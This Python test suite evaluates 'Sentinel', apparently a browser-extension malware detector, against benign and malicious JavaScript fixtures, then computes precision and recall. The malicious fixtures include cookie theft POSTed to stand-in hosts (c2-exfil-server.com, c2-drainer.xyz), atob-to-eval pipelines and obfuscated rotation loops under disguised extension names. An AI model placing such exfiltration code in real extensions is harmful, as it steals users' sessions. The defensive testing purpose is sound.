"""Source-level JavaScript Obfuscation and Transformation Evaluation Suite.

Evaluates Sentinel against real source-level code transformations:
- Plain benign JavaScript
- Minified benign JavaScript (Webpack/Terser)
- Bundled benign code with Base64 asset data URIs
- Benign code with hexadecimal identifiers/constants
- Benign encoded strings (template/l10n decoding without execution)
- Suspicious dynamic code construction (Function constructor calculation)
- Malicious decode-to-exec pipelines (atob -> eval)
- Malicious cookie theft and outbound exfiltration
- Malicious Obfuscator.io string array + rotation loops
- Malicious remote script dropper (fetch -> eval)
- Syntax error / incomplete source recovery
"""

from __future__ import annotations

import tempfile
from dataclasses import dataclass
from pathlib import Path
from typing import Any

from backend.app.schemas.manifest import NormalizedManifest
from backend.app.services.inference_service import run_full_inference
from backend.app.services.safe_extractor import ExtractionSummary
from ml.parsing.ast_analyzer import analyze_javascript_file

SOURCE_FIXTURES: list[dict[str, Any]] = [
    {
        "fixture_id": "plain_benign_tabs",
        "description": "Standard clean tab counter utility",
        "transformation": "None (clean source)",
        "ground_truth": "benign",
        "expected_category": "ordinary_source",
        "expected_verdicts": ["LOW_RISK", "SUSPICIOUS_UNCERTAIN"],
        "manifest": {
            "manifest_version": 3,
            "name": "Tab Counter Clean",
            "version": "1.0.0",
            "permissions": ["tabs"],
        },
        "scripts": {
            "background.js": """
                chrome.tabs.query({}, function(tabs) {
                    console.log('Open tab count: ' + tabs.length);
                    chrome.action.setBadgeText({text: String(tabs.length)});
                });
            """
        },
    },
    {
        "fixture_id": "minified_benign_webpack",
        "description": "Legitimately minified productivity bundle via Webpack/Terser",
        "transformation": "Terser variable mangling and single-line compression",
        "ground_truth": "benign",
        "expected_category": "legitimately_minified",
        "expected_verdicts": ["LOW_RISK", "SUSPICIOUS_UNCERTAIN"],
        "manifest": {
            "manifest_version": 3,
            "name": "Productivity Utility Minified",
            "version": "2.0.0",
            "permissions": ["storage"],
        },
        "scripts": {
            "bundle.min.js": (
                "!function(e){var t={};function n(r){if(t[r])return t[r].exports;var o=t[r]={i:r,l:!1,exports:{}};"
                "return e[r].call(o.exports,o,o.exports,n),o.l=!0,o.exports}n.m=e,n.c=t,n.d=function(e,t,r){"
                "n.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:r})},n.r=function(e){"
                "'undefined'!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:'Module'}),"
                "Object.defineProperty(e,'__esModule',{value:!0})},n.t=function(e,t){if(1&t&&(e=n(e)),8&t)return e;"
                "var r=Object.create(null);return n.r(r),Object.defineProperty(r,'default',{enumerable:!0,value:e}),r},"
                "n.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};"
                "return n.d(t,'a',t),t},n.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},n.p='';"
                "return n(n.s=0)}([function(e,t,n){'use strict';var r=function(e){return e*2};"
                "chrome.storage.local.set({ready:!0});console.log(r(21))}]);"
            )
        },
    },
    {
        "fixture_id": "bundled_benign_svg_data_uri",
        "description": "Clean extension with embedded base64 SVG asset data URIs",
        "transformation": "Inlined static SVG icons as Base64 data URIs",
        "ground_truth": "benign",
        "expected_category": "ordinary_source",
        "expected_verdicts": ["LOW_RISK", "SUSPICIOUS_UNCERTAIN"],
        "manifest": {
            "manifest_version": 3,
            "name": "Theme Extension with SVG",
            "version": "1.0.0",
            "permissions": ["storage"],
        },
        "scripts": {
            "theme.js": """
                const iconSvg = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgaGVpZ2h0PSIxNiIgdmlld0JveD0iMCAwIDE2IDE2Ij48cGF0aCBkPSJNMCAwaDE2djE2SDB6IiBmaWxsPSJub25lIi8+PC9zdmc+';
                const fontWoff = 'data:font/woff2;base64,d09GMgABAAAAAAKwAAoAAAAABaQAAAJhAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAABmAALAoqhnwBNgIkAxQEIAWDHAcsG7YEtgQ2A84XAAA=';
                document.getElementById('icon').src = iconSvg;
            """
        },
    },
    {
        "fixture_id": "benign_hex_constants",
        "description": "Color utility with hexadecimal constants",
        "transformation": "Color palette definitions using hex variables",
        "ground_truth": "benign",
        "expected_category": "ordinary_source",
        "expected_verdicts": ["LOW_RISK", "SUSPICIOUS_UNCERTAIN"],
        "manifest": {
            "manifest_version": 3,
            "name": "Palette Picker",
            "version": "1.1.0",
            "permissions": ["storage"],
        },
        "scripts": {
            "palette.js": """
                const COLOR_PRIMARY = 0x1a2b3c;
                const COLOR_SECONDARY = 0x4d5e6f;
                const COLOR_ACCENT = 0x00ff88;
                function getRgb(hex) {
                    return [(hex >> 16) & 255, (hex >> 8) & 255, hex & 255];
                }
                chrome.storage.local.set({palette: getRgb(COLOR_PRIMARY)});
            """
        },
    },
    {
        "fixture_id": "benign_base64_template_decoder",
        "description": "Localization utility decoding base64 text for display",
        "transformation": "Base64 string decode without eval or code execution",
        "ground_truth": "benign",
        "expected_category": "ordinary_source",
        "expected_verdicts": ["LOW_RISK", "SUSPICIOUS_UNCERTAIN"],
        "manifest": {
            "manifest_version": 3,
            "name": "L10n Helper",
            "version": "1.0.0",
            "permissions": ["storage"],
        },
        "scripts": {
            "l10n.js": """
                const encodedWelcome = 'V2VsY29tZSB0byBvdXIgcHJvZHVjdGl2aXR5IHRvb2wh';
                const greeting = window.atob(encodedWelcome);
                document.getElementById('msg').textContent = greeting;
            """
        },
    },
    {
        "fixture_id": "suspicious_dynamic_formula",
        "description": "Calculator utility using Function constructor for math formulas",
        "transformation": "Dynamic Function constructor invocation",
        "ground_truth": "benign",
        "expected_category": "suspiciously_transformed",
        "expected_verdicts": ["SUSPICIOUS_UNCERTAIN", "LOW_RISK"],
        "manifest": {
            "manifest_version": 3,
            "name": "Formula Evaluator",
            "version": "1.0.0",
            "permissions": ["storage"],
        },
        "scripts": {
            "calculator.js": """
                function evaluateFormula(expr) {
                    // Dynamic math expression evaluation
                    return new Function('return ' + expr)();
                }
                console.log(evaluateFormula('2 + 3 * 4'));
            """
        },
    },
    {
        "fixture_id": "malware_atob_eval_pipeline",
        "description": "Payload unpacker feeding decoded base64 into eval()",
        "transformation": "Base64 decode-to-execution pipeline (atob -> eval)",
        "ground_truth": "malicious",
        "expected_category": "confirmed_malicious_signature",
        "expected_verdicts": ["HIGH_RISK", "KNOWN_MALICIOUS_IOC"],
        "manifest": {
            "manifest_version": 2,
            "name": "Flash Player Update",
            "version": "1.0.0",
            "permissions": ["<all_urls>", "webRequest", "webRequestBlocking"],
            "content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self'",
        },
        "scripts": {
            "payload_runner.js": """
                const b64 = 'dmFyIGE9J2V2aWwnOw==';
                const code = window.atob(b64);
                window.eval(code);
            """
        },
    },
    {
        "fixture_id": "malware_cookie_stealer_exfil",
        "description": "Session hijacker intercepting cookies and exfiltrating to C2",
        "transformation": "Sensitive API + broad host + outbound network egress",
        "ground_truth": "malicious",
        "expected_category": "confirmed_malicious_signature",
        "expected_verdicts": ["HIGH_RISK", "KNOWN_MALICIOUS_IOC"],
        "manifest": {
            "manifest_version": 3,
            "name": "Quick PDF Tool",
            "version": "1.0.0",
            "permissions": ["cookies"],
            "host_permissions": ["<all_urls>"],
        },
        "scripts": {
            "background.js": """
                chrome.cookies.getAll({}, function(cookies) {
                    fetch('https://c2-exfil-server.com/collect', {
                        method: 'POST',
                        body: JSON.stringify(cookies)
                    });
                });
            """
        },
    },
    {
        "fixture_id": "malware_obfuscator_io_pattern",
        "description": "Commercial Obfuscator.io hex mangling with rotation loop and eval",
        "transformation": "Hex identifiers + array shift/push rotation + dynamic exec",
        "ground_truth": "malicious",
        "expected_category": "obfuscated_with_sensitive_behavior",
        "expected_verdicts": ["HIGH_RISK", "KNOWN_MALICIOUS_IOC"],
        "manifest": {
            "manifest_version": 3,
            "name": "Crypto Wallet Enhanced",
            "version": "1.0.0",
            "permissions": ["tabs", "storage"],
            "host_permissions": ["*://*.binance.com/*"],
        },
        "scripts": {
            "obf.js": """
                var _0x5a1b = ['shift', 'push', 'cookies', 'exfil', 'binance', 'keys'];
                (function(_0x2d1a, _0x5b3c) {
                    var _0x1c4e = function(_0x4e2a) {
                        while (--_0x4e2a) {
                            _0x2d1a['push'](_0x2d1a['shift']());
                        }
                    };
                    _0x1c4e(++_0x5b3c);
                }(_0x5a1b, 0x1f4));
                var _0x3e1a = function(_0x1a2b) {
                    return _0x5a1b[_0x1a2b];
                };
                chrome['tabs']['query']({}, function(_0x4a1b) {
                    fetch('https://c2-drainer.xyz/api', {method: 'POST', body: JSON.stringify(_0x4a1b)});
                });
                eval(window['atob']('Y29uc29sZS5sb2coJ3B3bmVkJyk='));
            """
        },
    },
    {
        "fixture_id": "parser_error_recovery",
        "description": "Incomplete / corrupt JavaScript syntax test",
        "transformation": "Intentional syntax error in JS file",
        "ground_truth": "benign",
        "expected_category": "ordinary_source",
        "expected_verdicts": ["LOW_RISK", "SUSPICIOUS_UNCERTAIN"],
        "manifest": {
            "manifest_version": 3,
            "name": "Corrupt Syntax Extension",
            "version": "0.1.0",
            "permissions": ["storage"],
        },
        "scripts": {
            "broken.js": """
                function incompleteFunction(a, b {
                    // Missing closing parenthesis
                    console.log(a + b);
            """
        },
    },
]


@dataclass
class FixtureEvaluationResult:
    fixture_id: str
    description: str
    ground_truth: str
    predicted_verdict: str
    risk_score: float
    code_category: str
    passed: bool
    details: dict[str, Any]


def run_source_level_obfuscation_suite() -> dict[str, Any]:
    """Execute full source-level evaluation suite against controlled test matrix."""
    results: list[FixtureEvaluationResult] = []
    tp = 0
    fp = 0
    tn = 0
    fn = 0

    for fixture in SOURCE_FIXTURES:
        with tempfile.TemporaryDirectory(prefix="sentinel_suite_") as tmp_dir_str:
            tmp_dir = Path(tmp_dir_str)

            # Write manifest
            import json
            (tmp_dir / "manifest.json").write_text(json.dumps(fixture["manifest"]), encoding="utf-8")

            # Write scripts
            for s_name, s_code in fixture["scripts"].items():
                (tmp_dir / s_name).write_text(s_code, encoding="utf-8")

            # Run AST analysis directly on first script
            first_js = next(tmp_dir.glob("*.js"))
            ast_res = analyze_javascript_file(first_js)

            # Run full Sentinel inference pipeline
            norm_manifest = NormalizedManifest(
                manifest_version=fixture["manifest"].get("manifest_version", 3),
                name=fixture["manifest"].get("name", "Test Ext"),
                version=fixture["manifest"].get("version", "1.0.0"),
                permissions=fixture["manifest"].get("permissions", []),
                host_permissions=fixture["manifest"].get("host_permissions", []),
            )
            summary = ExtractionSummary(
                sha256="test_" + fixture["fixture_id"],
                format="dir",
                file_count=len(fixture["scripts"]) + 1,
                total_bytes=sum(len(c.encode("utf-8")) for c in fixture["scripts"].values()),
                js_file_count=len(fixture["scripts"]),
            )

            scan_res = run_full_inference(
                temp_dir=tmp_dir,
                sha256="test_" + fixture["fixture_id"],
                format_str="dir",
                manifest=norm_manifest,
                summary=summary,
            )

            is_mal = fixture["ground_truth"] == "malicious"
            pred_mal = scan_res.risk_verdict in {"HIGH_RISK", "KNOWN_MALICIOUS_IOC"}

            if is_mal and pred_mal:
                tp += 1
            elif not is_mal and not pred_mal:
                tn += 1
            elif not is_mal and pred_mal:
                fp += 1
            else:
                fn += 1

            passed = scan_res.risk_verdict in fixture["expected_verdicts"]

            results.append(
                FixtureEvaluationResult(
                    fixture_id=fixture["fixture_id"],
                    description=fixture["description"],
                    ground_truth=fixture["ground_truth"],
                    predicted_verdict=scan_res.risk_verdict,
                    risk_score=scan_res.risk_score,
                    code_category=ast_res.code_category,
                    passed=passed,
                    details={
                        "category": ast_res.code_category,
                        "dynamic_exec": ast_res.dynamic_exec_count,
                        "aliased_eval": ast_res.aliased_eval_count,
                        "atob_exec": ast_res.atob_exec_count,
                        "parser_warning": ast_res.parser_warning,
                        "top_factors": [f.feature_name for f in scan_res.top_risk_factors[:3]],
                    },
                )
            )

    total = len(results)
    precision = float(tp / (tp + fp)) if (tp + fp) > 0 else 1.0
    recall = float(tp / (tp + fn)) if (tp + fn) > 0 else 1.0
    f1 = float(2 * precision * recall / (precision + recall)) if (precision + recall) > 0 else 0.0
    fpr = float(fp / (fp + tn)) if (fp + tn) > 0 else 0.0

    return {
        "total_fixtures": total,
        "counts": {"tp": tp, "fp": fp, "tn": tn, "fn": fn},
        "metrics": {
            "precision": round(precision, 4),
            "recall": round(recall, 4),
            "f1": round(f1, 4),
            "fpr": round(fpr, 4),
        },
        "all_passed": all(r.passed for r in results),
        "results": [
            {
                "fixture_id": r.fixture_id,
                "description": r.description,
                "ground_truth": r.ground_truth,
                "predicted_verdict": r.predicted_verdict,
                "risk_score": r.risk_score,
                "code_category": r.code_category,
                "passed": r.passed,
                "details": r.details,
            }
            for r in results
        ],
    }
